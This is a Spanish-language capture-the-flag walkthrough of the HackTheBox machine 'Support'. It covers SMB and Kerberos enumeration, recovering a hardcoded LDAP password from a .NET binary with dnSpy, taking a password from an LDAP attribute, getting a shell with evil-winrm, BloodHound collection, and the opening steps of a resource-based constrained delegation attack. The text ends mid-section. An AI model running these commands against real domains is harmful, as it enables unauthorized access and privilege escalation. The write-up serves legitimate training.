---
title: Support - Easy (HTB)
permalink: /Support-HTB-Writeup/
tags: 
  - "Windows"
  - "Easy"
  - "SMB Enumeration"
  - "dnSPY" 
  - "Binary Reversing"
  - "LDAP Enumeration"
  - "BloodHound"
  - "SharpHound"
  - "RBCD"
categories:
  - writeup
  - hacking
  - hackthebox
  - "active directory"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Support - Easy (HTB)
seo_description: Aprende acerca de enumeración de diversos protocolos en entornos de Active Directory. Pon en práctica habilidades de Debugging, enumeración con BloodHound y explotación de RBCD para vencer Support.
excerpt: Aprende acerca de enumeración de diversos protocolos en entornos de Active Directory. Pon en práctica habilidades de Debugging, enumeración con BloodHound y explotación de RBCD para vencer Support.
header:
  overlay_image: /assets/images/headers/support-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/support-hackthebox.jpg
---


![image-center](/assets/images/posts/support-hackthebox.png)
{: .align-center}

**Habilidades:** SMB Enumeration, EXE Binary Analysis, Binary Debugging (`dnSPY`), LDAP Enumeration, Domain Analysis - BloodHound + `SharpHound.exe`, Resource Based Constrained Delegation Attack (RBCD) - [Privilege Escalation]
{: .notice--primary}

# Introducción

Support es una máquina Windows de dificultad `Easy` en la plataforma de HackTheBox. Este desafío contempla un entorno de Active Directory donde pondremos en práctica enumeración de servicios mal configurados, además de explotación  

<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.174                         
PING 10.10.11.174 (10.10.11.174) 56(84) bytes of data.
64 bytes from 10.10.11.174: icmp_seq=1 ttl=127 time=149 ms

--- 10.10.11.174 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 148.912/148.912/148.912/0.000 ms
~~~


## Nmap Scanning 

Haremos un escaneo de puertos con el fin de detectar todos los puertos que se encuentren abiertos. Primeramente haremos uso del protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.174 -oG openPorts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 22:45 EDT
Nmap scan report for 10.10.11.174
Host is up (0.20s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
49684/tcp open  unknown
49699/tcp open  unknown
49733/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 53.78 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo frente a los puertos que hemos descubierto con el fin de detectar la versión y servicio que estén ejecutando

~~~ bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49674,49684,49699,49733 -sVC 10.10.11.174 -oN services   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 22:49 EDT
Nmap scan report for 10.10.11.174
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-08 02:50:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49733/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-08T02:50:56
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.92 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Según la información visible en la captura, podemos ver el dominio `support.htb` y el nombre de host `DC`, contemplaremos esta información en el archivo `/etc/hosts`

~~~ bash
cat /etc/hosts | grep support.htb                    
10.10.11.174 support.htb DC.support.htb
~~~


## SMB Enumeration

Adicionalmente podemos lanzar `netexec` para hacer una enumeración de SMB para validar si podemos acceder a recursos compartidos en la red sin proporcionar contraseña

~~~ bash
nxc smb 10.10.11.174 -u '' -p ''
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\: 
~~~

Al parecer nos permite conectarnos sin credenciales, haremos los mismo con otras herramientas como `smbclient` o `smbmap`. Sin embargo, si intentamos listar los recursos de red directamente desde `netexec`, veremos que no tenemos acceso

~~~ bash
nxc smb 10.10.11.174 -u '' -p '' --shares 
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\: 
SMB         10.10.11.174    445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
~~~

Sin embargo, si hacemos pruebas con otras herramientas podremos conectarnos y ver información

~~~ bash
smbclient -L 10.10.11.174 -U "guest%"
WARNING: Ignoring invalid value 'LANNET1' for parameter 'client min protocol'
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
~~~

Más cómodamente usaremos `smbmap`, herramienta que nos permite ver los permisos de los que disponemos para cada unidad

~~~ bash
smbmap -H 10.10.11.174 -u 'guest' -p '' 
[+] IP: 10.10.11.174:445	Name: support.htb                                       
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	support-tools                                     	READ ONLY	support staff tools
	SYSVOL                                            	NO ACCESS	Logon server share 
~~~

Vemos un recurso `support-tools`, al cual tenemos permisos de escritura, revisaremos su contenido

~~~ bash
smbclient //10.10.11.174/support-tools -U "guest%"
~~~

Una vez establezcamos la conexión, encontraremos los siguientes archivos dentro del disco `support-tools`

~~~
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

		4026367 blocks of size 4096. 956416 blocks available
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (35.6 KiloBytes/sec) (average 35.6 KiloBytes/sec)
~~~

Podemos ver una serie de herramientas para Windows. Descargaremos el archivo `UserInfo.exe.zip`


## EXE Binary Analysis - `strings`

Al extraer este comprimido, nos quedan muchos archivos `.dll`. Sin embargo particularmente uno puede llamar nuestra atención, un archivo llamado `UserInfo.exe`, listaremos los caracteres imprimibles con `strings`

~~~ bash
strings -e l UserInfo.exe
@%1;
	5W5
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
armando
LDAP://support.htb
support\ldap
[-] At least one of -first or -last is required.
(givenName=
(sn=
(&(givenName=
)(sn=
[*] LDAP query to use: 
sAMAccountName
[-] No users identified with that query.
[+] Found 
 result
~~~

En este caso hacemos uso del formato  `UTF-16LE` (Unicode en little-endian), que es el formato que usa Windows para representar texto en archivos ejecutables

Lograremos ver un posible usuario válido a nivel de dominio, generaremos un listado de usuarios

~~~ bash
support\ldap

cat users.txt 
ldap
~~~

Además vemos una cadena un tanto peculiar, que podría ser una credencial con o sin codificación

~~~ text
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
~~~


## Kerberos User Validation

Validaremos este usuario frente al protocolo `kerberos`
 
~~~ bash
kerbrute userenum --dc 10.10.11.174 -d support.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/08/25 - Ronnie Flathers @ropnop

2025/04/08 18:04:08 >  Using KDC(s):
2025/04/08 18:04:08 >  	10.10.11.174:88

2025/04/08 18:04:08 >  [+] VALID USERNAME:	ldap@support.htb
2025/04/08 18:04:08 >  Done! Tested 1 usernames (1 valid) in 0.150 seconds
~~~

Y el usuario es válido, además podemos usar un diccionario de `seclists` para intentar enumerar más usuarios potenciales válidos para el dominio `support.htb`

~~~ bash
kerbrute userenum --dc 10.10.11.174 -d support.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/08/25 - Ronnie Flathers @ropnop

2025/04/08 18:04:54 >  Using KDC(s):
2025/04/08 18:04:54 >  	10.10.11.174:88

2025/04/08 18:05:02 >  [+] VALID USERNAME:	support@support.htb
2025/04/08 18:05:06 >  [+] VALID USERNAME:	guest@support.htb
2025/04/08 18:05:32 >  [+] VALID USERNAME:	administrator@support.htb
~~~

Hemos encontrado un usuario válido llamado `support`, lo agregaremos a nuestro listado de usuarios

~~~ bash
cat users.txt
ldap
support
~~~


## EXE Analysis - Windows

Primeramente debemos disponer de un Windows 10 de 64 bits para poder ejecutar el binario. Compartiremos el archivo `UserInfo.exe.ziz` a través de la red local, esto lo podemos hacer de varias formas. En mi caso, compartiré el recurso a través de un servidor SMB

~~~ bash
smbserver.py smbFolder $(pwd) -smb2support -username andrew -password pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
~~~

Para evitar bloqueos del Defender, habilitaremos la autenticación con usuario y contraseña, así podremos acceder tranquilamente al recurso desde Windows

~~~ bash
C:\Users\Andrew\Documents>net use \\192.168.29.137\smbFolder\UserInfo.exe.zip /user:andrew pass
Se ha completado el comando correctamente.

C:\Users\Andrew\Documents>copy \\192.168.29.137\smbFolder\UserInfo.exe.zip
        1 archivo(s) copiado(s).
~~~

Una vez tenemos el comprimido en la máquina Windows, extraeremos los archivos

![image-center](/assets/images/posts/support-exe-analysis.png){: align-center}

Lanzaremos una consola dentro del directorio actual, esto lo podemos hacer si presionamos `Shift` + Clic Derecho > Abrir ventana de Powershell Aqu o aún más sencillo con el siguiente tip

![image-center](/assets/images/posts/support-exe-analysis-open-cmd.png){: align-center}

Si ejecutamos el binario de primeras, veremos un panel de ayuda con las opciones disponibles 

~~~ bash
C:\Users\Andrew\Documents\UserInfo.exe>.\UserInfo.exe

Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user
~~~

Si ejecutamos con la opción `find` más el parámetro `-first` podremos buscar usuarios. Sin embargo, cuando intentamos usar esta funcionalidad, obviamente no se podrá hacer la conexión al servidor

~~~ bash
	C:\Users\Andrew\Documents\UserInfo.exe>.\UserInfo.exe find -first ldap
[-] Exception: El servidor no es funcional.
~~~

Esto ocurre debido a que no estamos conectados a la VPN de Hackthebox desde Windows. Para conectarnos compartiremos el archivo de VPN de nuestra cuenta de HTB a través de la red local.

Esta vez lo haremos por HTTP, levantaremos un servidor en nuestra máquina atacante, podemos hacer un cambio temporal de directorio

~~~ bash
pushd /home/incommatose/Documents
python3 -m http.server 80                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

 - Volveremos a nuestro directorio de trabajo con el comando `popd`

Ahora desde la máquina Windows descargaremos el archivo de VPN a través de un navegador o directamente con el comando `curl`

~~~ bash
C:\Users\Andrew\Documents\UserInfo.exe> curl http://192.168.29.137/lab_incommatose.ovpn -o lab_incommatose.ovpn
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3343  100  3343    0     0  50285      0 --:--:-- --:--:-- --:--:-- 50651
~~~

### Windows `/etc/hosts` File

Si nos conectamos a través de OpenVPN Connect, tendremos asignada una IP correctamente, sin embargo, nuestra máquina Windows no conoce `support.htb`

![image-center](/assets/images/posts/support-openvpn-connect.png){: align-center}

~~~ bash
C:\Users\Andrew\Documents\UserInfo.exe>ping support.htb

Haciendo ping a support.htb [10.10.11.174] con 32 bytes de datos:
Tiempo de espera agotado para esta solicitud.
~~~

Esto es porque **aún nos falta agregar el dominio** `support.htb` al archivo `/etc/hosts` de Windows al igual que en Linux, solamente cambia la ruta de este archivo.

El archivo en cuestión está ubicado en `C:\Windows\System32\Drivers\etc\hosts`. Abriremos un bloc de notas como administrador directamente presionando `Windows + R`, se abrirá la ventana para ejecutar un comando, escribiremos `notepad` y en vez de presionar `Enter`, haremos `Ctrl + Shift + Enter`

![image-center](/assets/images/posts/support-editing-etc-hosts.png){: align-center}

Una vez dentro del bloc de notas abrimos la ruta donde está el archivo `/etc/hosts` y agregamos el dominio

~~~ text
# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost

10.10.11.174 support.htb
~~~

Guardaremos los cambios con `Ctrl + G` y saldremos del bloc de notas, entonces nuestra máquina Windows podrá conectarse con `support.htb`

~~~ bash
C:\Users\Andrew\Documents\UserInfo.exe>ping support.htb

Haciendo ping a support.htb [10.10.11.174] con 32 bytes de datos:
Respuesta desde 10.10.11.174: bytes=32 tiempo=162ms TTL=127
Respuesta desde 10.10.11.174: bytes=32 tiempo=153ms TTL=127
~~~

### EXE Analysis - Finding Users

Ahora con el DNS interno configurado, buscaremos a la cuenta `ldap`, se nos mostrará el siguiente mensaje

~~~ bash
C:\Users\Andrew\Documents\UserInfo.exe>.\UserInfo.exe find -first l -last p
[-] No users identified with that query.
~~~

Como la consulta posiblemente sea a través de LDAP, usaremos `*` para hacer referencia a cualquier caracter

~~~ bash
C:\Users\Andrew\Documents\UserInfo.exe>.\UserInfo.exe find -first * -last *
raven.clifton
anderson.damian
monroe.david
cromwell.gerard
west.laura
levine.leopoldo
langley.lucy
daughtler.mabel
bardot.mary
stoll.rachelle
thomas.raphael
smith.rosario
wilson.shelby
hernandez.stanley
ford.victoria
~~~

Guardaremos este listado de usuarios en un archivo `users.txt` y lo enviaremos a nuestra máquina Linux

~~~ bash
C:\Users\Andrew\Documents\UserInfo.exe>.\UserInfo.exe find -first * -last * > users.txt
~~~

Usaremos el método por SMB de forma similar a cuando compartimos el archivo de VPN

~~~ bash
smbserver.py smbFolder $(pwd) -smb2support -username andrew -password asdsa     
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
~~~

Desde Windows copiamos el archivo `users.txt` a nuestro recurso SMB. Como ya habíamos iniciado una sesión con SMB, no necesitamos volver a ejecutar el comando `net use`, sin embargo, si por algún motivo se cerrara esta sesión, debemos volver a iniciarla

~~~ bash
C:\Users\Andrew\Documents\UserInfo.exe>copy users.txt \\192.168.29.137\smbFolder\users.txt
        1 archivo(s) copiado(s).
~~~

Podemos comprobar el estado de la sesión con el siguiente comando desde una `powershell` (requiere privilegios de Administrador)

~~~ bash
PS C:\Windows\system32> Get-SmbConnection

ServerName     ShareName UserName               Credential            Dialect NumOpens
----------     --------- --------               ----------            ------- --------
192.168.29.137 smbFolder DESKTOP-ED5EBHA\Andrew 192.168.29.137\andrew 2.0.2   1
~~~
<br>


# Intrusión / Explotación
---
## dnSPY Binary Debugging

Instalaremos `dnSPY` con el propósito de analizar el código fuente y su comportamiento en tiempo real aplicando `Debugging`

- https://github.com/dnSpy/dnSpy

Dentro de las clases definidas encontraremos la query LDAP en la clase `LdapQuery`

~~~ c#
public LdapQuery()
		{
			string password = Protected.getPassword();
			this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
			this.entry.AuthenticationType = AuthenticationTypes.Secure;
			this.ds = new DirectorySearcher(this.entry);
		}
~~~

Existe una variable `password`, la cual aplica un método de la clase `Protected`, si nos dirigimos a ella, encontraremos lo siguiente

~~~ c#
public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
~~~

Se realiza un tratamiento a la variable `enc_password`, la cual es una cadena codificada, al parecer se aplica una palabra clave `armando` para desencriptarla. Iniciaremos una depuración desde la clase `LdapQuery` para ver el valor de la variable `password` en tiempo de ejecución.

### dnSPY - Breakpoint

Iniciaremos la depuración definiendo un `Breakpoint` para que la ejecución se detenga en una línea específica, y debemos enviar los mismos argumentos para hacer la búsqueda de usuarios

![image-center](/assets/images/posts/support-debugging.png){: align-center}

Haremos clic en `Aceptar` y al cabo de unos segundos veremos el valor de la variable `password` una vez se haya ejecutado el tratamiento

![image-center](/assets/images/posts/support-debugging-creds.png){: align-center}

Para copiar solamente el valor podemos hacer Clic Derecho > `Copiar Valor` o `Ctrl + Mayús + C`, y se copiará el siguiente valor, que podemos notar que es diferente al que vimos en la clase `Protected`

~~~ bash
# Quitamos las comillas
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
~~~

Sabemos que esta contraseña pertenece a la cuenta `ldap` gracias a la siguiente línea de código, ya que usa la contraseña para autenticarse con la cuenta `support\ldap` a la máquina víctima

~~~ c#
this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
~~~

Podemos intentar validar estas credenciales frente a otros protocolos como `smb` o `winrm` para intentar conectarnos con una consola, sin embargo, solamente serán válidas frente a `LDAP`


## LDAP Enumeration

Usaremos el protocolo LDAP para enumerar información del dominio, el siguiente comando nos mostrará toda la información del dominio 

~~~ bash
ldapsearch -x -b "DC=support,DC=htb" -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 
~~~

Si buscamos por usuarios concretamente, encontraremos algo inusual en la información del usuario `support`

~~~ bash
ldapsearch -x -b "DC=support,DC=htb" -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' | grep -i "samaccountname: support" -B 37

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
~~~ 

En el atributo `info` podemos ver lo que parece ser una contraseña válida. También podemos notar que este usuario forma parte del grupo `Remote Management Users` por el atributo `memberOf`

~~~ bash
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
~~~

Intentaremos validar estas credenciales para cada usuario para ver si son válidas para más de un usuario

~~~ bash
nxc smb 10.10.11.174 -u users.txt -p 'Ironside47pleasure40Watchful'                 
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [-] support.htb\Administrator:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\Guest:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\krbtgt:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\ldap:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful
~~~

Recordemos que el puerto `5985` se encuentra abierto, esto pertenece al servicio `winrm`, el cual es un protocolo que nos permite conectarnos remotamente a una máquina para "administrarla remotamente", pero claro, nosotros no tenemos esas intenciones.

Podemos verificar que la cuenta `support` utilizando `netexec`, si aparece `Pwned`, entonces tenemos los privilegios suficientes para conectarnos con una consola

~~~ bash
nxc winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful' 
WINRM       10.10.11.174    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
WINRM       10.10.11.174    5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
~~~

### Shell as `support`

Y es el caso, por lo que ahora podemos hacer uso de `evil-winrm` para conectarnos con `powershell`

~~~ bash
evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
~~~
<br>


# Escalada de Privilegios
---
## DC Enumeration - BloodHound

Utilizaremos `BloodHound` para enumerar vías potenciales mediante las cuales podamos escalar privilegios.

Si no tenemos instalado `BloodHound`, podemos instalar su versión web, que simplifica mucho más la instalación:

- https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart#install-bloodhound-ce
- https://github.com/SpecterOps/SharpHound

~~~ bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz

tar -xvzf bloodhound-cli-linux-amd64.tar.gz

./bloodhound-cli install
~~~

Cuando instalemos correctamente BloodHound, podemos iniciar sesión en la siguiente URL, debemos cambiar las credenciales por defecto

~~~ bash
http://http://localhost:8080/ui/login
~~~

Para administrar la ejecución de BloodHound podemos usar los siguientes comandos

~~~ bash
./bloodhound-cli containers start # Iniciar
/opt/bloodhound-cli containers stop # Detener
~~~

![image-center](/assets/images/posts/support-bloodhound.png){: align-center}


## DC Enumeration - `SharpHound.exe`

Cuando tengamos el recolector en nuestro directorio de trabajo, podemos subirlo directamente a la máquina aprovechando la conexión con `evil-winrm`

~~~ bash
*Evil-WinRM* PS C:\Users\support\Documents> upload SharpHound.exe
                                        
Info: Uploading /home/incommatose/machines/htb/support/exploits/SharpHound.exe to C:\Users\support\Documents\SharpHound.exe
                                        
Data: 2076672 bytes of 2076672 bytes copied
                                        
Info: Upload successful!
~~~

Ahora ejecutamos para recolectar toda la información posible del dominio, luego descargaremos el archivo `.zip` que genera como resultado

~~~ bash
*Evil-WinRM* PS C:\Users\support\Documents> .\SharpHound.exe

*Evil-WinRM* PS C:\Users\support\Documents> dir


    Directory: C:\Users\support\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/14/2025   2:51 PM          26075 20250414145832_BloodHound.zip
-a----         4/14/2025   2:42 PM        1557504 SharpHound.exe
*Evil-WinRM* PS C:\Users\support\Documents> download 20250414145832_BloodHound.zip support_bloodhound.zip
                                        
Info: Downloading C:\Users\support\Documents\20250414145832_BloodHound.zip to support_bloodhound.zip
                                        
Info: Download successful! 
~~~

Cargaremos este archivo `.zip` en BloodHound, pero no sin antes hacerle un renombrado para identificarlo mejor, además podemos mover el archivo a una ruta genérica para encontrarlo más fácilmente

~~~ bash
cp support_bloodhound.zip /home/incommatose/Documents
~~~


## Resource Based Constrained Delegation Attack (RBCD)

Una vez cargada la información, buscaremos a la cuenta `support@support.htb`, haremos clic en `Inbound Object Controls` en la barra lateral derecha

![image-center](/assets/images/posts/support-rbcd.png){: align-center}

La cuenta `support` posee permisos `GenericAll` sobre el grupo `Account Operators`. Este permiso nos da control total sobre el grupo. El objetico de un ataque RBCD es impersonar a un usuario privilegiado sin conocer ni su contraseña ni su hash `NTLM`

### RBCD Attack - Setting up Tools

Para este ataque usaremos dos herramientas programadas en `powershell`: `PowerView` y `Powermad`. Descargaremos las herramientas en nuestro directorio de trabajo usando el comando `wget`

~~~ bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1 

wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1
~~~

Aprovechando la conexión que podemos hacer mediante `winrm`, subiremos las herramientas y las importaremos en la máquina víctima

~~~ bash
*Evil-WinRM* PS C:\Users\support\Documents> upload PowerView.ps1
*Evil-WinRM* PS C:\Users\support\Documents> upload Powermad.ps1

*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\Powermad.ps1
~~~

Para iniciar el ataque crearemos una nueva cuenta en la máquina, usaremos esta cuenta para establecer RBCD

~~~ bash
*Evil-WinRM* PS C:\Users\support\Documents>  New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = SERVICEA$
Verbose: [+] Distinguished Name = CN=SERVICEA,CN=Computers,DC=support,DC=htb
[+] Machine account SERVICEA added
~~~

Asignamos el atributo `PrincipalsAllowedToDelegateToAccount` a la cuenta `SERVICEA`, esto autoriza a esta cuenta a suplantar usuarios dentro del Domain Controller

~~~ bash
Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount SERVICEA$
~~~

Comprobaremos que el atributo se haya asignado con el siguiente comando, debemos ver la cuenta `SERVICEA` en el output

~~~ bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount


DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
DNSHostName                          : dc.support.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
PrincipalsAllowedToDelegateToAccount : {CN=SERVICEA,CN=Computers,DC=support,DC=htb}
SamAccountName                       : DC$
SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000
UserPrincipalName                    :
~~~

Aplicamos la configuración necesaria de permisos para la delegación, otorgando estos permisos a la cuenta `SERVICEA` 

~~~ bash
